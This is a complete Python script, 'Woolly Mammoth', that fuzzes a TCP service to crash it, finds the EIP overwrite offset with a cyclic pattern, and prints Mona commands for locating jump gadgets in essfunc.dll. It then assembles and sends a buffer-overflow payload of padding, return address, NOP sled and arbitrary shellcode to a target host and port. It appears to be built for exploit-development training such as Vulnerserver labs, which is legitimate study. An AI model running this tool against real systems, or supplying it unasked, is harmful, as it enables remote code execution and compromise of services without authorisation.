#!/usr/bin/env python3

import socket
import os
import sys
import argparse
from time import sleep

from colorama import Fore,Style

banner = (
" __    __            _ _                                              _   _     \n"
"/ / /\ \ \___   ___ | | |_   _  /\/\   __ _ _ __ ___  _ __ ___   ___ | |_| |__  \n"
"\ \/  \/ / _ \ / _ \| | | | | |/    \ / _` | '_ ` _ \| '_ ` _ \ / _ \| __| '_ \ \n"
" \  /\  / (_) | (_) | | | |_| / /\/\ \ (_| | | | | | | | | | | | (_) | |_| | | |\n"
"  \/  \/ \___/ \___/|_|_|\__, \/    \/\__,_|_| |_| |_|_| |_| |_|\___/ \__|_| |_|\n"
"                         |___/                                                  \n")

parser = argparse.ArgumentParser(description='Woolly Mammoth Socket Fuzzer')

#group = parser.add_mutually_exclusive_group(required=True)
subparser = parser.add_subparsers(dest="subparser")
fuzz = subparser.add_parser('fuzz', help='Socket-based fuzzer that allows command prefix (optional)')
offset = subparser.add_parser('offset', help='Sending unique string pattern to identify EIP offset in a debugger.')
eip = subparser.add_parser('eip', help='Enter the offset pattern hex string to identify the offset value.')
exploit = subparser.add_parser('exploit', help='Create buffer-overflow exploit on the command line with optional prefix.')

#fuzz.add_argument('--fuzz','-f',help='Fuzz value (using optional prefix)',action='store_true',required=False,default=False,dest='fuzz')
fuzzRequired = fuzz.add_argument_group('Required Arguments')
fuzzRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
fuzzRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
fuzz.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")

#offset.add_argument('--offset','-o',help='Send offset pattern string',action='store_true',required=False,default=False,dest='offset')
offsetRequired = offset.add_argument_group('Required Arguments')
offsetRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
offsetRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
offset.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")

eipRequired = eip.add_argument_group('Required Arguments')
eipRequired.add_argument('--eip','-e',help='Enter the EIP value to identify offset code.',required=True,default="",dest='eip')


exploitRequired = exploit.add_argument_group('Required Arguments')
exploitRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
exploitRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
exploitRequired.add_argument('--eip','-e',help='Enter the EIP JMP/PUSH;RET address as assembly shellcode.',required=True,dest='eip',default="",type=str)
exploitRequired.add_argument('--offset','-o',help='Enter the EIP offset value as an integer.',required=True,dest='offset',type=int,default="")
exploitRequired.add_argument('--shellcode','-s',help='Enter the shellcode for the exploit.',required=True,dest='shellcode',type=str)
exploit.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")
exploit.add_argument('--nops','-n',help='Enter the number of NOPs to send as an integer (default: 10).',required=False,dest='nops',default=10,type=int)

args = parser.parse_args()

def PrintGreen(text):
    return (Fore.GREEN + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintBlue(text):
    return (Fore.BLUE + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintRed(text):
    return (Fore.RED + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def find_str(s, char):
    index = 0

    if char in s:
        c = char[0]
        for ch in s:
            if ch == c:
                if s[index:index+len(char)] == char:
                    return index

            index += 1

    return -1

def main():

    print (banner)

    # Variables

    try:
        host = args.target
        port = args.port
        print (PrintBlue("[i]") + " Target:\t\t" + args.target + ":" + str(args.port))
        print (PrintBlue("[i]") + " Prefix:\t\t" + args.prefix)
    except:
        host = ""
        port = ""
        
    bufRan = ""
    bufStart = 50

    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lower = "abcdefghijklmnopqrstuvwxyz"
    number = "0123456789"

    for u in upper:
        for l in lower:
            for n in number:
                    bufRan += u + l + n


    if (args.subparser == "fuzz"):
        prevBufLength = 0
        while (True):
            buffer = args.prefix.strip() + bufRan[:bufStart]

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.settimeout(3)
                x = s.recv(1024)
                s.send(buffer.encode())
                bufLength = (len(buffer) - len(args.prefix))
                prevBufLength = bufLength
                #delete_last_lines()
                print(PrintBlue("[i]") + " Fuzzing:\t\t" + str(bufLength) + " Bytes", end='\r')
                s.close()
                sleep(0.5)
                bufStart += 50
            except:
                print (sys.exc_info())
                print ("\nInformation:")
                print (PrintGreen("[+]") + " Server crashed between " + str(prevBufLength) + " and %s Bytes" % str(len(buffer) - len(args.prefix)))
                print (PrintRed("[!]") + " Send offset pattern using '-o' to identify EIP offset")
                sys.exit()
                
            buffer = args.prefix + bufRan[:bufStart]

    elif (args.subparser == "offset"):
        try:
            buffer = args.prefix.strip() + bufRan
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.settimeout(3)
            x = s.recv(1024)
            s.send(buffer.encode())
            s.close()
            sleep(0.5)
            bufStart += 100
            print ("\nInformation:")
            print (PrintRed("[!]") + " Check EIP for offset value")
        except:
            sys.exit()
            
    elif (args.subparser == "eip"):
        offsetHex = args.eip
        offsetAscii = (bytearray.fromhex(offsetHex).decode())
        offsetPosition = find_str(bufRan,offsetAscii)
        
        if (offsetPosition == -1):
            offsetAscii = (bytearray.fromhex(offsetHex).decode())[::-1]
            offsetPosition = find_str(bufRan,offsetAscii)

        print (PrintBlue("[i]") + " EIP Value: \t\t" + offsetHex)
        print (PrintBlue("[i]") + " EIP Value ASCII: \t" + offsetAscii)
        print (PrintGreen("[+]") + " Offset Position: \t" + str(offsetPosition))
        print ("\nNext Steps:")
        print (PrintRed("[!]") + " Locate vulnerable libraries with Mona: !mona modules")
        print (PrintRed("[!]") + ' Identify valid JMP with Mona: !mona find -s "\\xff\\xe4" -m "essfunc.dll"')
        print (PrintRed("[!]") + ' Identify valid PUSH RET with Mona: !mona find -s "\\x5c\\xc3" -m "essfunc.dll"')
        
        
    elif (args.subparser == "exploit"):
        print (PrintBlue("[i]") + " EIP JMP/PUSH: \t" + str(args.eip))
        print (PrintBlue("[i]") + " EIP Offset Length: \t" + str(args.offset))    
        print (PrintBlue("[i]") + " NOPs: \t\t" + str(args.nops))    
              
        nops = b"\x90" * args.nops
        
        # very hacky method of getting shellcode to send over a socket from command line
        #               Prefix                             Offset                                             EIP                                      NOPS                            Shellcode
        buffer = args.prefix.strip().encode() + ("A" * int(args.offset)).encode() + bytearray([int(x, 16) for x in args.eip.split("\\x") if len(x)]) + nops + bytearray([int(x, 16) for x in args.shellcode.split("\\x") if len(x)])

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(buffer)
        s.close()

if __name__ == "__main__":
    main()
